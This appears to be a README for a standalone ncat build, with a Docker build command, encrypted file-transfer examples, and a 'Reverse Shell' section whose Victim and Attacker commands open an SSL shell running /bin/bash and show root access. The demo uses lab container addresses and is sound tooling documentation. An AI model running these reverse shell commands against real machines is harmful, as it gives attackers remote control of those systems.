# Ncat

## Build

* Use the Github action as an example or below:
```
docker build -t ncat_standalone_bullseye:$(date +%s) -f ncat_standalone/containers/debian/bullseye/Dockerfile .
```

## Transfer files

* Sender with encryption
```
./ncat --send-only --ssl 172.17.0.3 443 < test.txt
```

* Listener with encryption
```
./ncat -l 443 --ssl > test.txt
```

## Reverse Shell

* Victim
```
./ncat# ./ncat 172.17.0.3 443 --ssl -v -e /bin/bash
Ncat: Version 7.93SVN ( https://nmap.org/ncat )
Ncat: Subject: CN=localhost
Ncat: Issuer: CN=localhost
Ncat: SHA-1 fingerprint: AF56 2CA6 D608 1C41 BBA9 2775 4927 E1E6 F1B7 9D62
Ncat: Certificate verification failed (self signed certificate).
Ncat: SSL connection to 172.17.0.3:443.
Ncat: SHA-1 fingerprint: AF56 2CA6 D608 1C41 BBA9 2775 4927 E1E6 F1B7 9D62
```

* Attacker
```
./ncat --ssl -l 443 -v
Ncat: Version 7.93SVN ( https://nmap.org/ncat )
Ncat: Generating a temporary 2048-bit RSA key. Use --ssl-key and --ssl-cert to use a permanent one.
Ncat: SHA-1 fingerprint: AF56 2CA6 D608 1C41 BBA9 2775 4927 E1E6 F1B7 9D62
Ncat: Listening on [::]:443
Ncat: Listening on 0.0.0.0:443
Ncat: Connection from 172.17.0.2:49318.
whoami
root
hostname
e1b438003141
```
